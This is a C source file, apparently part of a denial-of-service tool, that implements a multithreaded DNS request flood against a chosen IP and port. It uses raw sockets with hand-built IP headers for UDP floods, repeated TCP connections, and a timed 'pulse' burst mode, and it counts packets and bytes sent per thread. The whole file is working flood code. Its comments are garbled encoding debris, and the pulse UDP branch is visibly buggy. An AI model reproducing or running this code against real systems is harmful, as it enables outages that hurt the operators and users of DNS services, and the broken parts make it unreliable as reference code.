/********************************************************************************/
/* ʵʩ��������                                                                 */
/* author:cp                                                                    */
/* 2008.4.3                                                                     */
/* change:2009.11.25                                                            */
/********************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <string.h>
#include <stdio.h>
#include <pthread.h>
#include <arpa/inet.h>

#include "attack.h"
#include "packetdns.h"

extern float attackTimeRealgo;//ȫ�ֱ���:ʵ�ʹ�����ʱ�䣬��Ҫ���ڷ��Ͱ�������趨����ʱ����ʱ��ʱ��ͳ��
static unsigned long pthread_send_package_num[MAX_PTHREAD_NUM];//ÿ���̷߳��͵İ���,���������Խ������
static unsigned long pthread_send_package_byte[MAX_PTHREAD_NUM];
int pthread_shutdown=0;
/********************************************************************************/
/* ���������������Լ��                                                       */
/********************************************************************************/
int getcd(int n,int m)
{
    int t,r;
    int result;
    if(n==0||m==0){//���������һ����Ϊ0���򷵻������еĴ���
        if(n>=m)
            result = n;
        else
            result = m;
    } 
    else{//��������Ϊ0
        if(n<m){
            t=n;
            n=m;
            m=t;
        }
        while(m!=0){
            r=n%m;
            n=m;
            m=r;
        }
        result = n;
    }
    return result;
}
/********************************************************************************/
/* д�����ݵ��ļ���                                                             */
/********************************************************************************/
int writeToFile(char * LineContent)
{
    //������ļ�
    FILE * fp;
	fp = fopen("attackResult.txt","a");
    if(fp == NULL){
        printf("X Error: File:attackResult.txt Can Not Open To Write\n");
        return 0;
    }
	fprintf(fp,"%s\r\n",LineContent);
    fclose(fp);
	return 1;
}
/********************************************************************************/
/* д�ַ���ָ���ļ�                                                             */
/* �������:�ַ�,Ҫд����ļ�                                                   */
/********************************************************************************/
int writechartofile(int s,char *filename)
{
    FILE *fp;
    if((fp=fopen(filename,"w"))==NULL){
        printf("can't open file.");
        return 0;
    }
    fprintf(fp,"%d",s);
    fclose(fp);
    return 1;
}



/********************************************************************************/
/* ��ø��̷߳��Ͱ���֮��                                                       */
/* ����:�����ܺ�                                                                */
/********************************************************************************/
unsigned long getSendPackageNum(int startThreadNumber)
{
	int i;
	unsigned long sum=0;
	//char lineContentTemp[MAXSIZE];
	int threadNumber = startThreadNumber;//�����߳���
	for(i=0;i<threadNumber;i++){
		/* output*******************************/
		printf("* pthread%d:send package num:%ld\n",i,pthread_send_package_num[i]);
		//bzero(lineContentTemp,MAXSIZE);
        //sprintf(lineContentTemp,
		//		"* pthread%d:send package num:%ld<br>\n",
		//		i,pthread_send_package_num[i]);
        //writeToFile(lineContentTemp);
        /***************************************/
		sum += pthread_send_package_num[i];		
	}
	return sum;
}
/********************************************************************************/
/* ��ø��̷߳���Byte֮��                                                       */
/* ����:����Byte�ܺ�                                                            */
/********************************************************************************/
unsigned long getSendByte(int startThreadNumber)
{
	int i;
	unsigned long sum=0;
	//char lineContentTemp[MAXSIZE];
	int threadNumber = startThreadNumber;//�����߳���
	for(i=0;i<threadNumber;i++){
		/* output*******************************/
		printf("* pthread%d:send byte:%ldB\n",i,pthread_send_package_byte[i]);
		//bzero(lineContentTemp,MAXSIZE);
        //sprintf(lineContentTemp,
		//		"* pthread%d:send byte:%ldB<br>\n",
		//		i,pthread_send_package_byte[i]);
        //writeToFile(lineContentTemp);
		/***************************************/
		sum += pthread_send_package_byte[i];
	}
	return sum;
}
void clearSendDate()
{
	int i;
	for(i=0;i<MAX_PTHREAD_NUM;i++){
		pthread_send_package_num[i]=0;
		pthread_send_package_byte[i]=0;
	}
}
/********************************************************************************/
/* ��һģʽ��ÿ�������̵߳�ִ��                                                 */
/********************************************************************************/
void newppthread_signal(void *attackM)
{
	char *datap=NULL;
	struct attackM_st *attDT = (struct attackM_st *)attackM;
	
    ddosConfig *ddosc = attDT->ddosc;
    
	int attackIpLinklength,attackPortLinkLength;
	attackIpLinklength = getLinkLength_arr(ddosc->ipls);
	attackPortLinkLength = getLinkLength_arr(ddosc->portls);
    int packetLen=0;//���Ͱ��İ���
    struct sockaddr_in sin;
    int sockfd=0,foo,ret;

	//printf("_attackIp:%s\n",attDT->attackIp);
    //printf("_attackPort:%s\n",attDT->attackPort);
    //printf("____pthread_id:%d\n",attDT->pthread_id);	

    int attackStyleNum=0;//�������ͱ��(1/2,udp/tcp)
    //�ж����������͵Ĺ���
    attackStyleNum = 1;
    if(ddosc->style_dns.protocol==1)
        attackStyleNum=2;//default:udp
    else
        attackStyleNum=4;//tcp
        
	printf("* pthread_%d:[dnsrequestflood]protocol[%d]\n",attDT->pthread_id,attackStyleNum);
    printf("* ----------------------------------------\n");
	
	if(attackStyleNum==1){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		//packetLen=ddosc->synStyle->packetLength;
	}
	else if(attackStyleNum==2){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		packetLen = ddosc->style_dns.packetLength;
		//printf("*packetLen[%d]\n",packetLen);
	}
	else if(attackStyleNum==3){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		//packetLen = ddosc->icmpStyle->packetLength;
	}
	else
		packetLen=ddosc->style_dns.packetLength;
    
    if(attackStyleNum!=4) { //����http
        foo=1;
        if( (setsockopt(sockfd, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
   
    //��÷��Ͱ����빥��ʱ��,�˴������빥��ʱ�佫����ì�ܣ������Ϊ����
    int sendPacketNumber;//��Ҫ���͵���С����
    double attackTime;//��Ϊ��λ
    sendPacketNumber = ddosc->sendPacketNumber;
    attackTime = ddosc->attackTime;//�õ������ʱ�䣬�԰����֮��ķ������ݼ�����п���
    int tempTime;//��õļ��ʱ��
    struct timeval t_start;//start time when send starts
    struct timeval t_end;//end time when one send over
    float sendedtime=0;//�ѹ���ʱ��
    float tempfloattime;
	int pulseyn = ddosc->pulseyn;//���ȼ���Ƿ�Ϊ��������
	sin.sin_family=AF_INET;
	if((sin.sin_port=htons(atoi(attDT->attackPort)))==0){
		printf("unknown port.\n");
		return;
	}
	sin.sin_addr.s_addr =inet_addr(attDT->attackIp);
	gettimeofday(&t_start,NULL);
	
	if(pulseyn==1)//���ȹ���
	{
		if(attackStyleNum!=4)
		{//��ʹ��tcp	
			while(!pthread_shutdown&&(pthread_send_package_num[attDT->pthread_id]<sendPacketNumber||sendedtime<attackTime))
			{
			    char dataArrary[MAXLENGTH];//������
			    int pkt_len=0;
			    memset(dataArrary,0,MAXLENGTH);
				//���
			    if(attackStyleNum==2) //udp dns������
			    { 
					pkt_len = ip_udp_dns_package(dataArrary,&(ddosc->style_dns),attDT->attackIp,attDT->attackPort);
				}
				
				if(sendto(sockfd,dataArrary,pkt_len,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("X Error:send package wrong.");
                    //exit(1);
					continue;
				}
				pthread_send_package_byte[attDT->pthread_id] += pkt_len;
				pthread_send_package_num[attDT->pthread_id]++;
				//�������
				tempTime = getSleepTime(&(ddosc->packetTimels));
				//printf("sleepTime:%d;",tempTime);
				if(tempTime!=0)
					usleep(tempTime);
				gettimeofday(&t_end,NULL);
				tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
				sendedtime = tempfloattime/1000000;
				
			}
			close(sockfd);
		}
		else if(attackStyleNum==4) 
		{ //����tcp dns
			while(!pthread_shutdown&&(pthread_send_package_num[attDT->pthread_id]<sendPacketNumber||sendedtime<attackTime))
			{
			    char dataArrary[MAXLENGTH];//������
			    int pkt_len=0;
			    memset(dataArrary,0,MAXLENGTH);
			    
				if((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1)
				{
					perror("socket wrong!");
					exit(1);    
				}
				ret = connect(sockfd,(struct sockaddr *)&sin,sizeof(sin));
				if(ret)
				    printf("failed to connect to %s.\n",attDT->attackIp);
				else
				{
					pkt_len = tcp_dns_package(dataArrary,&(ddosc->style_dns));
					ret = write(sockfd,dataArrary,pkt_len);
				}
				pthread_send_package_num[attDT->pthread_id]++;
				pthread_send_package_byte[attDT->pthread_id] += pkt_len;
				//�������
				tempTime = getSleepTime(&(ddosc->packetTimels));
				if(tempTime!=0)
					usleep(tempTime);
				
				gettimeofday(&t_end,NULL);
				tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
				sendedtime = tempfloattime/1000000;
				close(sockfd);
			}
		}
		//�����̹߳���ʱ����ڴ�ʱ��ʵ�ʹ���ʱ��ʱ������ĸ���ʵ�ʹ���ʱ��
		if(sendedtime>attackTimeRealgo)
		{
			attackTimeRealgo = sendedtime;
		}
	}
	else
	{//��������
		int cycleTime = ddosc->cycleTime;//����ʱ��(s)
		int pulseTime = ddosc->pulseTime;//������������ʱ��(s)
		int speed = ddosc->speed;//��������(��/s)
		int sendedpulsenum;//�������������з��͵İ���
		int pulseNum = attackTime/cycleTime ;//������
		int ipulse; 
		struct timeval t_pulse_start;//start pulse time when send starts
		struct timeval t_pulse_end;//end pulse time when send starts
		float sendedpulsetime;//��pulse��ʱ��(s)
		int sleepTime = (cycleTime-pulseTime)*1000000;//΢�뼶��
		int sPackageTime = 1000000/speed-getOnePackageTime;//��1����ʱ��΢��,��ǰĬ����֯һ�����ݰ���ƽ��ʱ��Ϊ70us
		if(sPackageTime<0)
			sPackageTime=0;
		int sendallpacnum;//ÿ�����巢�͵İ��� 
		sendallpacnum = pulseTime*speed;
		if(attackStyleNum!=4){//����http
			for(ipulse=0;ipulse<pulseNum;ipulse++){
				gettimeofday(&t_pulse_start,NULL);
				sendedpulsetime=0;
				sendedpulsenum=0;
				while(!pthread_shutdown&&sendedpulsenum<sendallpacnum&&sendedpulsetime<pulseTime)
				{
				    char dataArrary[MAXLENGTH];//������
    			    int pkt_len=0;
    			    memset(dataArrary,0,MAXLENGTH);
    			    
					//���
					if(attackStyleNum==2) { //udp������
						//packetLen = ddosc->udpStyle.packetLength;
						pkt_len = ip_udp_dns_package(dataArrary,&(ddosc->style_dns),attDT->attackIp,attDT->attackPort);
					}
					
					//�������ݰ�
					if(sendto(sockfd,datap,packetLen,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						exit(1);
					}
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
					gettimeofday(&t_pulse_end,NULL);
					tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);  
					sendedpulsetime =tempfloattime/1000000;//s
					//printf("sendpulsetime:%f\n",sendedpulsetime);
				}
				usleep(sleepTime);
			}
			close(sockfd);
		}
		else if(attackStyleNum==4) { //����tcp_dns������
			for(ipulse=0;ipulse<pulseNum;ipulse++){
				gettimeofday(&t_pulse_start,NULL);
				sendedpulsetime=0;
				sendedpulsenum=0;
				while(!pthread_shutdown&&pthread_send_package_num[attDT->pthread_id]<pulseTime*speed&&sendedpulsetime<pulseTime)
				{
                    char dataArrary[MAXLENGTH];//������
    			    int pkt_len=0;
    			    memset(dataArrary,0,MAXLENGTH);
    			    
					if((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1){
						perror("socket wrong!");
						exit(1);
					}
					ret = connect(sockfd,(struct sockaddr *)&sin,sizeof(sin));
					if(ret){
						printf("failed to connect to %s.\n",attDT->attackIp);
					}
					else {
						//packetLen=ddosc->httpStyle->packetLength;
					    pkt_len = tcp_dns_package(dataArrary,&(ddosc->style_dns));
						ret = write(sockfd,dataArrary,pkt_len);
					}
					pthread_send_package_num[attDT->pthread_id]++;
					pthread_send_package_byte[attDT->pthread_id] += pkt_len;
					sendedpulsenum++;
					usleep(sPackageTime);
					gettimeofday(&t_pulse_end,NULL);
					tempfloattime = 1000000*(t_pulse_end.tv_sec-t_pulse_start.tv_sec)+(t_pulse_end.tv_usec-t_pulse_start.tv_usec);  
					sendedpulsetime =tempfloattime/1000000;//s
					close(sockfd);
				}
				usleep(sleepTime);
			}
		}
	}
	
	return;
}
/********************************************************************************/
/* ����ÿ��ip��ĳ��port,��ָ����Ŀ�Ĺ����߳�                                    */
/********************************************************************************/
int newthread(struct attackM_st attackM)
{
    int i,err;
    pthread_t ppid[MAX_PTHREAD_NUM];
    int threadNumber = attackM.ddosc->startThreadNumber;//�����߳���
    //printf("pnum[%d]mode[%d]\n\n",threadNumber,attackM.ddosc->mode);

    struct attackM_st attackT[threadNumber];
   
    if(attackM.ddosc->mode==1)
    {
        for(i=0;i<threadNumber;i++)
        {
            attackT[i].attackIp = attackM.attackIp;
            attackT[i].attackPort = attackM.attackPort;
            attackT[i].ddosc = attackM.ddosc;
			attackT[i].pthread_id = i;
			
			//printf("**--[%d]\n",attackT[i].pthread_id);
            err=pthread_create(&ppid[i],NULL,(void *)newppthread_signal,(void *)(&attackT[i]));//������ģʽ�������߳�
            if(err!=0)
            {
                printf("create pthread error!\n");
                exit(1);
        	}
        }
		for(i=0;i<threadNumber;i++)
			pthread_join(ppid[i],NULL);
    }
    else 
    {
        printf("dnsattack fixed mode cannot use now.\n");
    }
	return 0;
}

